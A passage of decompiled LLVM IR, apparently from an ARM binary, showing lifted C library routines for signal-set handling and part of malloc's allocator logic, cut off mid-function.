  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1698c = load i32, i32* @r7, align 4
  store i32 %v3_1698c, i32* %stack_var_-8, align 4
  %v0_16998 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16998, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16998, -4095
  br i1 %tmp, label %dec_label_pc_169c0, label %dec_label_pc_169a8

dec_label_pc_169a8:                               ; preds = %entry
  %v0_169ac = call i32 @__aeabi_read_tp()
  %v3_169b0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_169b0 = sext i16 %v3_169b0 to i32
  %v0_169b4 = load i32, i32* @r2, align 4
  %v1_169b4 = sub i32 0, %v0_169b4
  store i32 %v1_169b4, i32* @r2, align 4
  %v3_169b8 = add i32 %v4_169b0, %v0_169ac
  %v4_169b8 = inttoptr i32 %v3_169b8 to i32*
  store i32 %v1_169b4, i32* %v4_169b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_169c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %entry, %dec_label_pc_169a8
  %v1_169c4 = phi i32 [ %v0_16998, %entry ], [ -1, %dec_label_pc_169a8 ]
  %v2_169c0 = phi i32 [ %v3_1698c, %entry ], [ %v2_169c0.pre, %dec_label_pc_169a8 ]
  store i32 %v2_169c0, i32* @r7, align 4
  ret i32 %v1_169c4

; uselistorder directives
  uselistorder i32 %v0_16998, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169c0, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_169c8:
  %v0_169c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_169c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_169c8
  %tmp = ptrtoint i64* %arg2 to i32
  %v2_169c8 = load i32, i32* @sb, align 4
  %v9_169c8 = shl i32 %v2_169c8, %tmp
  %v10_169c8 = and i32 %v9_169c8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_169c8, %bb
  %v12_169cc = phi i32 [ %arg1, %dec_label_pc_169c8 ], [ %v10_169c8, %bb ]
  ret i32 %v12_169cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_169e8, label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %entry
  %v7_169e4 = icmp slt i32 %arg2, 65
  br i1 %v7_169e4, label %dec_label_pc_16a04, label %dec_label_pc_169e8

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169e0, %entry
  %v0_169ec = call i32 @__aeabi_read_tp()
  %v3_169f0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_169f0 = sext i16 %v3_169f0 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_169fc = add i32 %v4_169f0, %v0_169ec
  %v4_169fc = inttoptr i32 %v3_169fc to i32*
  store i32 22, i32* %v4_169fc, align 4
  %v0_16a0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169e0
  %v0_16a04 = call i32 @__sigaddset()
  store i32 %v0_16a04, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169e8, %dec_label_pc_16a04
  %v0_16a0c = phi i32 [ %v0_16a0c.pre, %dec_label_pc_169e8 ], [ %v0_16a04, %dec_label_pc_16a04 ]
  ret i32 %v0_16a0c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16a0c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_16a28 = add i32 %tmp, 4
  %v3_16a28 = inttoptr i32 %v2_16a28 to i32*
  store i32 0, i32* %v3_16a28, align 4
  %v1_16a2c = load i32, i32* %r3.global-to-local, align 4
  %v2_16a2c = inttoptr i32 %v1_16a2c to i32*
  store i32 0, i32* %v2_16a2c, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16a34 = load i32, i32* @r4, align 4
  store i32 %v3_16a34, i32* %stack_var_-16, align 4
  %v6_16a34 = load i32, i32* @r5, align 4
  %v9_16a34 = load i32, i32* @r6, align 4
  %v7_16a3c = icmp eq i32 %arg2, -1
  br i1 %v7_16a3c, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_16a44 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_16a60

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_16a68

dec_label_pc_16a60:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  %v7_16a64 = icmp slt i32 %arg1, 65
  br i1 %v7_16a64, label %dec_label_pc_16a84, label %dec_label_pc_16a68

dec_label_pc_16a68:                               ; preds = %.thread16, %dec_label_pc_16a60
  %v0_16a6c = call i32 @__aeabi_read_tp()
  %v3_16a70 = load i16, i16* @global_var_32088.1320, align 2
  %v4_16a70 = sext i16 %v3_16a70 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16a7c = add i32 %v4_16a70, %v0_16a6c
  %v4_16a7c = inttoptr i32 %v3_16a7c to i32*
  store i32 22, i32* %v4_16a7c, align 4
  %v0_16adc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a60
  %v2_16a84 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16a84, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_16a8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_16a8c, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_16a9c = call i32 @__sigaddset()
  %v0_16aa4 = load i32, i32* @r5, align 4
  store i32 %v0_16aa4, i32* %r1.global-to-local, align 4
  %v0_16aa8 = load i32, i32* @r6, align 4
  %v2_16aa8 = add i32 %v0_16aa8, 29220
  %v2_16aac = call i32 @__GI___sigismember(i32 %v2_16aa8, i32 %v0_16aa4)
  store i32 %v2_16a84, i32* %r1.global-to-local, align 4
  %v0_16ac0 = load i32, i32* @r5, align 4
  %v3_16acc = call i32 @__libc_sigaction(i32 %v0_16ac0, i32 %v2_16a84, i32 %v2_16a44)
  %v1_16ad0 = icmp slt i32 %v3_16acc, 0
  br i1 %v1_16ad0, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_16a84
  %v5_16ad4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_16ad4, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_16a84
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_16a68, %bb32
  %v0_16adc = phi i32 [ %v5_16ad4, %bb31 ], [ %v0_16adc.pre, %dec_label_pc_16a68 ], [ -1, %bb32 ]
  %v2_16ae4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16ae4, i32* @r4, align 4
  store i32 %v6_16a34, i32* @r5, align 4
  store i32 %v9_16a34, i32* @r6, align 4
  ret i32 %v0_16adc

; uselistorder directives
  uselistorder i32 %v2_16a84, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 4, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a68, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16af8 = add i32 %arg2, -1
  %v3_16afc = udiv i32 %v1_16af8, 32
  %v4_16b00 = mul nuw nsw i32 %v3_16afc, 4
  %v5_16b00 = add i32 %v4_16b00, %arg1
  %v6_16b00 = inttoptr i32 %v5_16b00 to i32*
  %v7_16b00 = load i32, i32* %v6_16b00, align 4
  %v1_16b04 = urem i32 %v1_16af8, 32
  %v7_16b0c = shl i32 1, %v1_16b04
  %v8_16b0c = and i32 %v7_16b00, %v7_16b0c
  %v10_16b0c = icmp ne i32 %v8_16b0c, 0
  %. = zext i1 %v10_16b0c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_16af8, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_16b1c = load i32, i32* @r1, align 4
  %v1_16b1c = add i32 %v0_16b1c, -1
  %v3_16b20 = udiv i32 %v1_16b1c, 32
  %v0_16b24 = load i32, i32* @r0, align 4
  %v4_16b24 = mul nuw nsw i32 %v3_16b20, 4
  %v5_16b24 = add i32 %v0_16b24, %v4_16b24
  %v6_16b24 = inttoptr i32 %v5_16b24 to i32*
  %v7_16b24 = load i32, i32* %v6_16b24, align 4
  %v1_16b28 = urem i32 %v1_16b1c, 32
  %v7_16b30 = shl i32 1, %v1_16b28
  %v8_16b30 = or i32 %v7_16b24, %v7_16b30
  store i32 %v8_16b30, i32* %v6_16b24, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16b1c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16b40 = add i32 %arg2, -1
  %v3_16b44 = udiv i32 %v1_16b40, 32
  %v4_16b48 = mul nuw nsw i32 %v3_16b44, 4
  %v5_16b48 = add i32 %v4_16b48, %arg1
  %v6_16b48 = inttoptr i32 %v5_16b48 to i32*
  %v7_16b48 = load i32, i32* %v6_16b48, align 4
  %v1_16b4c = urem i32 %v1_16b40, 32
  %tmp = shl i32 -1, %v1_16b4c
  %v8_16b54 = add i32 %tmp, -1
  %v9_16b54 = and i32 %v7_16b48, %v8_16b54
  store i32 %v9_16b54, i32* %v6_16b48, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16b40, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_16b64 = udiv i32 %arg1, 256
  store i32 %v3_16b64, i32* %r1.global-to-local, align 4
  %v2_16b68 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_16b68, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_16b74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16b68, i32 %v0_16b74)
  %v0_16b78 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b78 = add i32 %v0_16b78, 1048320
  %v3_16b7c = udiv i32 %v1_16b78, 65536
  %v1_16b80 = and i32 %v3_16b7c, 8
  %v6_16b84 = shl i32 %v0_16b78, %v1_16b80
  %v1_16b88 = add i32 %v6_16b84, 520192
  %v3_16b8c = udiv i32 %v1_16b88, 65536
  %v1_16b90 = and i32 %v3_16b8c, 4
  %v6_16b94 = shl i32 %v6_16b84, %v1_16b90
  %v1_16b98 = add i32 %v6_16b94, 245760
  %v3_16b9c = udiv i32 %v1_16b98, 65536
  %v1_16ba0 = and i32 %v3_16b9c, 2
  %v6_16ba4 = shl i32 %v6_16b94, %v1_16ba0
  store i32 %v6_16ba4, i32* %r1.global-to-local, align 4
  %v1_16ba8 = sub nsw i32 13, %v1_16b80
  %v2_16bac = sub nsw i32 %v1_16ba8, %v1_16b90
  %v3_16bb0 = udiv i32 %v6_16ba4, 32768
  %v4_16bb0 = sub nuw nsw i32 -1, %v3_16bb0
  %v4_16bb4 = udiv i32 %v6_16ba4, 16384
  %v5_16bb4 = and i32 %v4_16bb4, %v4_16bb0
  %v2_16bb8 = sub nsw i32 %v2_16bac, %v1_16ba0
  %v2_16bbc = add nsw i32 %v2_16bb8, %v5_16bb4
  %v1_16bc0 = add nsw i32 %v2_16bbc, 6
  %v0_16bc4 = load i32, i32* %ip.global-to-local, align 4
  %v6_16bc4 = lshr i32 %v0_16bc4, %v1_16bc0
  %v3_16bc8 = mul nsw i32 %v2_16bbc, 4
  %v1_16bcc = add nsw i32 %v3_16bc8, 32
  %v1_16bd0 = urem i32 %v6_16bc4, 4
  %v2_16bd4 = or i32 %v1_16bd0, %v1_16bcc
  ret i32 %v2_16bd4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_16bdc = load i32, i32* @r4, align 4
  %v6_16bdc = load i32, i32* @r5, align 4
  %v9_16bdc = load i32, i32* @r6, align 4
  %v12_16bdc = load i32, i32* @r7, align 4
  %v15_16bdc = load i32, i32* @r8, align 4
  %v18_16bdc = load i32, i32* @sb, align 4
  %v21_16bdc = load i32, i32* @sl, align 4
  %v24_16bdc = load i32, i32* @fp, align 4
  %v27_16bdc = load i32, i32* @lr, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  %v4_16bf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 120) to i32*), align 4
  store i32 %v4_16bf0, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_16bfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 76) to i32*), align 4
  store i32 %v4_16bfc, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_16bf0, i32* %r2.global-to-local, align 4
  %v2_16c08 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16c08, i32* %r0.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  %v4_16c14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  store i32 %v4_16c14, i32* %ip.global-to-local, align 4
  store i32 93216, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16c14)
  %v0_16c20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16c20, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r1, align 4
  %v4_16c2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 20) to i32*), align 4
  store i32 %v4_16c2c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_16c38.1466 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16c2c)
  %v0_16c38 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_16c38, -32
  br i1 %tmp, label %dec_label_pc_16c5c, label %dec_label_pc_16c40

dec_label_pc_16c40:                               ; preds = %entry
  store i32 111672, i32* %r2.global-to-local, align 4
  %v0_16c44 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c44, i32* %r0.global-to-local, align 4
  %v3_16c48 = load i16, i16* @global_var_32088.1320, align 2
  %v4_16c48 = sext i16 %v3_16c48 to i32
  store i32 %v4_16c48, i32* @r2, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_16c54 = add i32 %v4_16c48, %v0_16c44
  %v4_16c54 = inttoptr i32 %v3_16c54 to i32*
  store i32 12, i32* %v4_16c54, align 4
  br label %dec_label_pc_174e0

dec_label_pc_16c5c:                               ; preds = %entry
  %v1_16c5c = add i32 %v0_16c38, 11
  store i32 %v1_16c5c, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v2_16c68 = icmp ugt i32 %v1_16c5c, 14
  %v7_16c68 = icmp eq i32 %v1_16c5c, 15
  %v2_16c6c = xor i1 %v7_16c68, true
  %v3_16c6c = and i1 %v2_16c68, %v2_16c6c
  br i1 %v3_16c6c, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_16c5c
  %v5_16c6c = and i32 %v1_16c5c, -8
  store i32 %v5_16c6c, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_16c5c, %bb
  %v4_16c70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_16c70, i32* @r0, align 4
  %v1_16c74 = inttoptr i32 %v4_16c70 to i32*
  %v2_16c74 = load i32, i32* %v1_16c74, align 4
  store i32 %v2_16c74, i32* @r4, align 4
  %v2_16c78 = xor i1 %v2_16c68, true
  %v3_16c78 = or i1 %v7_16c68, %v2_16c78
  br i1 %v3_16c78, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_16c7c = urem i32 %v2_16c74, 2
  %v2_16c7c = icmp eq i32 %v1_16c7c, 0
  br i1 %v2_16c7c, label %dec_label_pc_16c84, label %dec_label_pc_16c94

dec_label_pc_16c84:                               ; preds = %bb140
  %v2_16c84 = icmp eq i32 %v2_16c74, 0
  br i1 %v2_16c84, label %dec_label_pc_16c8c, label %dec_label_pc_17070

dec_label_pc_16c8c:                               ; preds = %dec_label_pc_16c84
  %v0_16c8c = call i32 @__malloc_consolidate()
  store i32 %v0_16c8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17070

dec_label_pc_16c94:                               ; preds = %bb140
  %v0_16c94 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_16c94, %v2_16c74
  br i1 %tmp201, label %dec_label_pc_16cbc, label %dec_label_pc_16c9c

dec_label_pc_16c9c:                               ; preds = %dec_label_pc_16c94
  %v1_16c9c = add i32 %v4_16c70, -4
  store i32 %v1_16c9c, i32* %r1.global-to-local, align 4
  %v3_16ca0 = udiv i32 %v0_16c94, 8
  store i32 %v3_16ca0, i32* %r2.global-to-local, align 4
  %v4_16ca4 = mul nuw i32 %v3_16ca0, 4
  %v5_16ca4 = add i32 %v4_16ca4, %v1_16c9c
  %v6_16ca4 = inttoptr i32 %v5_16ca4 to i32*
  %v7_16ca4 = load i32, i32* %v6_16ca4, align 4
  store i32 %v7_16ca4, i32* %r0.global-to-local, align 4
  %v2_16ca8 = icmp eq i32 %v7_16ca4, 0
  br i1 %v2_16ca8, label %dec_label_pc_16cbc, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16c9c
  %v2_16cac = add i32 %v7_16ca4, 8
  %v3_16cac = inttoptr i32 %v2_16cac to i32*
  %v4_16cac = load i32, i32* %v3_16cac, align 4
  store i32 %v4_16cac, i32* %r3.global-to-local, align 4
  store i32 %v2_16cac, i32* %r0.global-to-local, align 4
  store i32 %v2_16cac, i32* %r4.global-to-local, align 4
  store i32 %v4_16cac, i32* %v6_16ca4, align 4
  br label %dec_label_pc_174c4

dec_label_pc_16cbc:                               ; preds = %dec_label_pc_16c9c, %dec_label_pc_16c94
  %tmp202 = icmp ugt i32 %v0_16c94, 255
  br i1 %tmp202, label %dec_label_pc_16d0c, label %dec_label_pc_16cc4

dec_label_pc_16cc4:                               ; preds = %dec_label_pc_16cbc
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_16ccc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  %v3_16cd0 = udiv i32 %v0_16c94, 8
  store i32 %v3_16cd0, i32* @r7, align 4
  %v4_16cd4 = mul nuw i32 %v3_16cd0, 8
  %v5_16cd4 = add i32 %v4_16ccc, %v4_16cd4
  store i32 %v5_16cd4, i32* %r3.global-to-local, align 4
  %v1_16cd8 = add i32 %v5_16cd4, 44
  store i32 %v1_16cd8, i32* %ip.global-to-local, align 4
  %v1_16cdc = add i32 %v5_16cd4, 56
  %v2_16cdc = inttoptr i32 %v1_16cdc to i32*
  %v3_16cdc = load i32, i32* %v2_16cdc, align 4
  store i32 %v3_16cdc, i32* %r0.global-to-local, align 4
  %v9_16ce0 = icmp eq i32 %v3_16cdc, %v1_16cd8
  br i1 %v9_16ce0, label %dec_label_pc_16e6c, label %dec_label_pc_16ce8

dec_label_pc_16ce8:                               ; preds = %dec_label_pc_16cc4
  %v2_16ce8 = add i32 %v3_16cdc, %v0_16c94
  store i32 %v2_16ce8, i32* %r3.global-to-local, align 4
  %v1_16cec = add i32 %v2_16ce8, 4
  %v2_16cec = inttoptr i32 %v1_16cec to i32*
  %v3_16cec = load i32, i32* %v2_16cec, align 4
  store i32 %v3_16cec, i32* %r2.global-to-local, align 4
  %v1_16cf0 = add i32 %v3_16cdc, 12
  %v2_16cf0 = inttoptr i32 %v1_16cf0 to i32*
  %v3_16cf0 = load i32, i32* %v2_16cf0, align 4
  store i32 %v3_16cf0, i32* %r1.global-to-local, align 4
  %v1_16cf4 = or i32 %v3_16cec, 1
  store i32 %v1_16cf4, i32* %r2.global-to-local, align 4
  %v1_16cf8 = add i32 %v3_16cdc, 8
  store i32 %v1_16cf8, i32* %r4.global-to-local, align 4
  store i32 %v1_16cf4, i32* %v2_16cec, align 4
  %v0_16d00 = load i32, i32* %ip.global-to-local, align 4
  %v1_16d00 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d00 = add i32 %v1_16d00, 8
  %v3_16d00 = inttoptr i32 %v2_16d00 to i32*
  store i32 %v0_16d00, i32* %v3_16d00, align 4
  %v0_16d04 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d04 = load i32, i32* %ip.global-to-local, align 4
  %v2_16d04 = add i32 %v1_16d04, 12
  %v3_16d04 = inttoptr i32 %v2_16d04 to i32*
  store i32 %v0_16d04, i32* %v3_16d04, align 4
  br label %dec_label_pc_174c4

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16cbc
  store i32 %v0_16c94, i32* %r0.global-to-local, align 4
  %v1_16d10 = call i32 @__malloc_largebin_index(i32 %v0_16c94)
  store i32 %v1_16d10, i32* %r0.global-to-local, align 4
  %v0_16d14 = load i32, i32* @r4, align 4
  %v1_16d14 = and i32 %v0_16d14, 2
  %v2_16d14 = icmp eq i32 %v1_16d14, 0
  store i32 %v1_16d10, i32* @r7, align 4
  br i1 %v2_16d14, label %dec_label_pc_16e6c, label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d0c
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  %v4_16d28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_16d28, i32* @r0, align 4
  %v0_16d2c = call i32 @__malloc_consolidate()
  store i32 %v0_16d2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16e6c

dec_label_pc_16d34:                               ; preds = %dec_label_pc_16e80
  %v1_16d34 = add i32 %v3_16e80, 4
  %v2_16d34 = inttoptr i32 %v1_16d34 to i32*
  %v3_16d34 = load i32, i32* %v2_16d34, align 4
  store i32 %v3_16d34, i32* %r3.global-to-local, align 4
  %v0_16d38 = load i32, i32* @sl, align 4
  %v1_16d3c = and i32 %v3_16d34, -4
  store i32 %v1_16d3c, i32* %r4.global-to-local, align 4
  %v1_16d40 = add i32 %v3_16e80, 12
  %v2_16d40 = inttoptr i32 %v1_16d40 to i32*
  %v3_16d40 = load i32, i32* %v2_16d40, align 4
  store i32 %v3_16d40, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_16d38, 255
  br i1 %tmp203, label %dec_label_pc_16d9c, label %dec_label_pc_16d48

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d34
  %v9_16d48 = icmp eq i32 %v3_16d40, %v0_16da0
  br i1 %v9_16d48, label %dec_label_pc_16d50, label %dec_label_pc_16d9c

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d48
  %v0_16d50 = load i32, i32* @sb, align 4
  %v1_16d50 = add i32 %v0_16d50, 48
  %v2_16d50 = inttoptr i32 %v1_16d50 to i32*
  %v3_16d50 = load i32, i32* %v2_16d50, align 4
  store i32 %v3_16d50, i32* %r3.global-to-local, align 4
  %v9_16d54 = icmp eq i32 %v3_16e80, %v3_16d50
  br i1 %v9_16d54, label %dec_label_pc_16d5c, label %dec_label_pc_16d9c

dec_label_pc_16d5c:                               ; preds = %dec_label_pc_16d50
  %v1_16d5c = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_16d3c, %v1_16d5c
  br i1 %tmp204, label %dec_label_pc_16d64, label %dec_label_pc_16d9c

dec_label_pc_16d64:                               ; preds = %dec_label_pc_16d5c
  %v2_16d64 = sub i32 %v1_16d3c, %v0_16d38
  store i32 %v2_16d64, i32* %r2.global-to-local, align 4
  %v2_16d68 = add i32 %v0_16d38, %v3_16e80
  store i32 %v2_16d68, i32* %r3.global-to-local, align 4
  %v1_16d6c = or i32 %v0_16d38, 1
  store i32 %v1_16d6c, i32* %r0.global-to-local, align 4
  %v1_16d70 = or i32 %v2_16d64, 1
  store i32 %v1_16d70, i32* %r1.global-to-local, align 4
  %v1_16d74 = add i32 %v3_16e80, 8
  store i32 %v1_16d74, i32* %r4.global-to-local, align 4
  %v2_16d78 = add i32 %v0_16da0, 8
  %v3_16d78 = inttoptr i32 %v2_16d78 to i32*
  store i32 %v2_16d68, i32* %v3_16d78, align 4
  %v0_16d7c = load i32, i32* %r3.global-to-local, align 4
  %v1_16d7c = load i32, i32* %ip.global-to-local, align 4
  %v2_16d7c = add i32 %v1_16d7c, 12
  %v3_16d7c = inttoptr i32 %v2_16d7c to i32*
  store i32 %v0_16d7c, i32* %v3_16d7c, align 4
  %v0_16d80 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d80 = load i32, i32* @r6, align 4
  %v2_16d80 = add i32 %v1_16d80, 4
  %v3_16d80 = inttoptr i32 %v2_16d80 to i32*
  store i32 %v0_16d80, i32* %v3_16d80, align 4
  %v0_16d84 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d84 = load i32, i32* @sb, align 4
  %v2_16d84 = add i32 %v1_16d84, 48
  %v3_16d84 = inttoptr i32 %v2_16d84 to i32*
  store i32 %v0_16d84, i32* %v3_16d84, align 4
  %v0_16d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d88 = load i32, i32* %r3.global-to-local, align 4
  %v3_16d88 = add i32 %v1_16d88, %v0_16d88
  %v4_16d88 = inttoptr i32 %v3_16d88 to i32*
  store i32 %v0_16d88, i32* %v4_16d88, align 4
  %v0_16d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d8c = load i32, i32* %r3.global-to-local, align 4
  %v2_16d8c = add i32 %v1_16d8c, 4
  %v3_16d8c = inttoptr i32 %v2_16d8c to i32*
  store i32 %v0_16d8c, i32* %v3_16d8c, align 4
  %v0_16d90 = load i32, i32* %ip.global-to-local, align 4
  %v1_16d90 = load i32, i32* %r3.global-to-local, align 4
  %v2_16d90 = add i32 %v1_16d90, 12
  %v3_16d90 = inttoptr i32 %v2_16d90 to i32*
  store i32 %v0_16d90, i32* %v3_16d90, align 4
  %v0_16d94 = load i32, i32* %ip.global-to-local, align 4
  %v1_16d94 = load i32, i32* %r3.global-to-local, align 4
  %v2_16d94 = add i32 %v1_16d94, 8
  %v3_16d94 = inttoptr i32 %v2_16d94 to i32*
  store i32 %v0_16d94, i32* %v3_16d94, align 4
  br label %dec_label_pc_174c4

